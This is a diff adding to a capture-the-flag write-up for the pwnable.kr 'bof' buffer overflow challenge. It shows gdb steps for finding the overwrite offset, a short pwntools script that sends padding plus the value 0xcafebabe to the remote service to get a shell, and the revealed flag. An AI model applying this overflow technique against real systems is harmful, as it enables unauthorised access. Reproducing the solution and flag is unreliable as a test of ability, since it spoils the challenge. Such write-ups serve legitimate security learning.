@@ -39,8 +39,23 @@ So we can input a bunch of stuff and try to find how many characters it takes un
 
 ![bof](https://user-images.githubusercontent.com/41026969/50838215-7e992d00-132b-11e9-9bf7-a7b63b78617d.png)
 
-So we do ```b *[address]``` sets a break point at the ```address``` we set it to, in this case we set the breakpoint right before the program compares the addresses. Then we rerun the program by typing ```r```. 
+So we do ```b *[address]``` sets a break point at the ```address``` we set it to, in this case we set the breakpoint right before the program compares the addresses. Then we rerun the program by typing ```r```.  When we get asked for the input, to get the exact amount of bytes we need to give it, so we do each letter 4 at a time because this program is 32 bits, which is 4 byte addresses. 
 
-When we get asked for the input, to get the exact amount of bytes we need to give it, so we do each letter 4 at a time because this program is 32 bits, which is 4 byte addresses. 
+We then hit the breakpoint, in which we can examine what's stored into ```$ebp + 0x8``` by doing x/wx [(command explanation here)[http://visualgdb.com/gdbreference/commands/x]. Thus we type the command: ```x/wx $ebp + 0x8```:
 
-### The second workaround
+![bof](https://user-images.githubusercontent.com/41026969/50840756-3a109000-1331-11e9-97ff-06fd1a88bfb2.png)
+
+So we see that ```0x4e4e4e4e``` was overwritten into the address. Checking what 4e is, we see it is equal to the letter```N```. Therefore, we can just copy and the letters A through M, and write in the address. I'm learning the pwntools library in python so I decided to write a simple python program (or you can manually do it yourself):
+```python
+from pwn import *
+
+session = remote("pwnable.kr", 9000)
+
+payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM" + "\xbe\xba\xfe\xca"
+
+session.sendline(payload)
+
+session.interactive()
+```
+After we get overwrite the buffer, the ```session.interactive()``` allows us to get a shell. Doing a quick ```whoami``` check reveals we are bof and that we can now read the flag. ```cat flag``` gives us the flag: ```daddy, I just pwned a buFFer :)```
+
